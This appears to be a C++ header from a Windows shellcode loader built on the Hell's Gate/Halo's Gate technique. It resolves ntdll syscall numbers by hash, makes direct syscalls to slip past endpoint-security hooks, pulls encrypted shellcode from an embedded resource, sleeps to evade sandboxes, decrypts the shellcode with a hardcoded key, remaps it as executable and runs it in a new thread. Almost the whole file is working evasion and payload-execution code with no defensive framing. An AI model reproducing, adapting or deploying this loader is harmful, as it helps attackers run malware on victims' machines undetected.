#pragma once

#include "gate_structs.h"
#include "crypt.h"

#include <stdarg.h>
#include <time.h>

#include "resource.h"

#define UP -32
#define DOWN 32

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

extern "C" VOID CreateGate(WORD wSystemCall);
extern "C" LONG GateDescent(...);

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);

BOOL Payload(
	_In_ PVX_TABLE pVxTable
);

INT GateSmasher() {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LdrData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;
	VX_TABLE Table = { 0 };

	Table.NtCreateSection.dwHash = 0x309c238a4e51667c;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateSection))
		return 0x1;
	
	Table.NtMapViewOfSection.dwHash = 0xb0de5c1838968f96;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtMapViewOfSection))
		return 0x1;

	Table.NtUnmapViewOfSection.dwHash = 0xa484b5a6aa7dc5d9;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtUnmapViewOfSection))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x442094df0d981c5c;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtWriteVirtualMemory.dwHash = 0xed40f374e72158be;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xdee64225c3519ce8;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	Table.NtClose.dwHash = 0xfe5dfdd24cc6ce9;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtClose))
		return 0x1;
	

	Payload(&Table);
	return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x35333831;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {

	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
		if (djb2((PBYTE)pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			if (*((PBYTE)pFunctionAddress) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				pVxTableEntry->wSystemCall = (high << 8) | low;

				return TRUE;
			}

			if (*((PBYTE)pFunctionAddress) == 0xe9) {
				for (WORD idx = 1; idx <= 500; idx++) {

					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						pVxTableEntry->wSystemCall = (high << 8) | low - idx;

						return TRUE;
					}

					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						pVxTableEntry->wSystemCall = (high << 8) | low + idx;

						return TRUE;
					}

				}
				return FALSE;
			}
			if (*((PBYTE)pFunctionAddress + 3) == 0xe9) {
				for (WORD idx = 1; idx <= 500; idx++) {

					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						pVxTableEntry->wSystemCall = (high << 8) | low - idx;
						return TRUE;
					}

					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						pVxTableEntry->wSystemCall = (high << 8) | low + idx;
						return TRUE;
					}

				}
				return FALSE;
			}
		}
	}

	return TRUE;
}


BOOL Payload(PVX_TABLE pVxTable) {

	t_FindResourceW C_FindResourceW = (t_FindResourceW)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strFindResourceW);
	t_LoadResource C_LoadResource = (t_LoadResource)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strLoadResource);
	t_LockResource C_LockResource = (t_LockResource)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strLockResource);
	t_SizeofResource C_SizeofResource = (t_SizeofResource)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strSizeofResource);

	// Generate a resource.rc & resource.h poiting to a file of binary (raw) type shellcode
	// .rsrc storage && .rsrc payload extraction
	HRSRC res = C_FindResourceW(NULL, MAKEINTRESOURCE(IDR_SCODE1), RT_RCDATA);
	HGLOBAL resHandle = C_LoadResource(NULL, res);
	unsigned char *payload = (unsigned char*)C_LockResource(resHandle);
	ULONG sSize = C_SizeofResource(NULL, res);
	
	// Decryption key for the shellcode
	const char key[] = { 'X','@','f','8','k','d','3','T','D','o','!','r','j','E' };
	SIZE_T sizeKey = sizeof(key);

	NTSTATUS status = 0x00000000;

	// -----------------
	//ULONG sSize = sizeof(payload);
	DWORD sectionSize = 4096*24;
	LARGE_INTEGER secSize = { sectionSize };

	HANDLE hSection = NULL;

	CreateGate(pVxTable->NtCreateSection.wSystemCall);
	status = GateDescent(
		&hSection,
		(SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE),
		NULL,
		(PLARGE_INTEGER)&secSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL);

	if (status != STATUS_SUCCESS) return EXIT_FAILURE;
	printf("[NTSTATUS] NtCreateSection -> \t( %#x )\n", status);
	printf("\t[+] Handle to created section -> \t( %#p )\n", hSection);

	HANDLE hProcess = (HANDLE)-1;
	ULONG viewSize = 0;
	PVOID sectionAddr = NULL;

	CreateGate(pVxTable->NtMapViewOfSection.wSystemCall);
	status = GateDescent(hSection, hProcess, &sectionAddr, NULL, NULL, NULL, &sectionSize, ViewUnmap, NULL, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) return EXIT_FAILURE;
	printf("[NTSTATUS] Mapped section status -> ( %#x )\n\
		* Memory Address \t( %#p )\n\
		* Mapping Protection \t( RW )\n", status, sectionAddr);

	SIZE_T writtenBytes = 0;
	CreateGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
	status = GateDescent(hProcess, sectionAddr, payload, sSize, &writtenBytes);
	if (status != STATUS_SUCCESS) {
		CreateGate(pVxTable->NtClose.wSystemCall);
		status = GateDescent(hSection);
	}
	printf("[NTSTATUS] Wrote shellcode to memory: %#x\n", status);
	printf("\t\t& Written bytes: %lld\n", writtenBytes);

	t_FreeResource C_FreeResource = (t_FreeResource)C_GetProcAddr(C_GetModuleHandle(wstrkernel32), strFreeResource);
	C_FreeResource(resHandle);

	printf("[SLEEP] Sleeping 1st time for 25 seconds\n");
	time_t ttime = time(&ttime);
	
	LARGE_INTEGER SsTimeout;
	SsTimeout.QuadPart = -250000000;
	CreateGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = GateDescent(hProcess, FALSE, &SsTimeout);

	LARGE_INTEGER secondssincestart;
	secondssincestart.QuadPart = (LONGLONG)difftime(time(NULL), ttime);
	if (secondssincestart.QuadPart >= SsTimeout.QuadPart) {
		printf("[SLEEP] Slept for 25 Seconds\n");
		printf("[CRYPT] Starting Memory Decryption...\n");

		if (f_SysCrypt032(sectionAddr, sSize, (char*)key, sizeKey) == TRUE) {
			printf("[CRYPT] Memory decrypted...\n");

			CreateGate(pVxTable->NtUnmapViewOfSection.wSystemCall);
			status = GateDescent(hProcess, sectionAddr);
			if (status == STATUS_SUCCESS) {
				printf("[UNMAP] Unmapped section of shellcode\n");
			}
			else {
				CreateGate(pVxTable->NtClose.wSystemCall);
				status = GateDescent(hSection);
				return EXIT_FAILURE;
			}
		}
		else {
			printf("[CRYPT] Failure during memory decryption \t( %d )\n", GetLastError());
			return EXIT_FAILURE;
		}
	}
	else 
	{
		printf("[*] The program took: %lld seconds\n", secondssincestart.QuadPart);
		printf("[-] Something is wrong\n");
		return EXIT_FAILURE;
	}

	time_t t2time = time(&t2time);
	LARGE_INTEGER S2sTimeout;
	S2sTimeout.QuadPart = -150000000;

	printf("[SLEEP] Sleeping 2nd time for 15 seconds\n");
	CreateGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = GateDescent(hProcess, FALSE, &S2sTimeout);

	LARGE_INTEGER secondssincestart2;
	secondssincestart2.QuadPart = (LONGLONG)difftime(time(NULL), t2time);
	
	if (secondssincestart2.QuadPart >= S2sTimeout.QuadPart) {
		printf("[SLEEP] Slept for 15 Seconds\n");
		printf("[MAP] Starting Memory Remap...\n");
		
		CreateGate(pVxTable->NtMapViewOfSection.wSystemCall);
		status = GateDescent(hSection, hProcess, &sectionAddr, NULL, NULL, NULL, &sectionSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);
		if (status != STATUS_SUCCESS) {
			CreateGate(pVxTable->NtClose.wSystemCall);
			status = GateDescent(hSection);
			return EXIT_FAILURE;
		}
		printf("[NTSTATUS] Remapped section status -> ( %#x )\n\
		* Memory Address \t( %#p )\n\
		* Mapping Protection \t( RX )\n", status, sectionAddr);
	}
	else 
	{
		printf("[*] The program took: %lld seconds\n", secondssincestart2.QuadPart);
		printf("[-] Something is wrong\n");
		return EXIT_FAILURE;
	}

	printf("[*] Creating thread and executing....\n");
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	CreateGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = GateDescent(&hHostThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)sectionAddr, NULL, FALSE, NULL, NULL, NULL, NULL);

	LARGE_INTEGER ScTimeout;
	ScTimeout.QuadPart = -10000000;
	CreateGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = GateDescent(hHostThread, FALSE, NULL);

	return TRUE;
}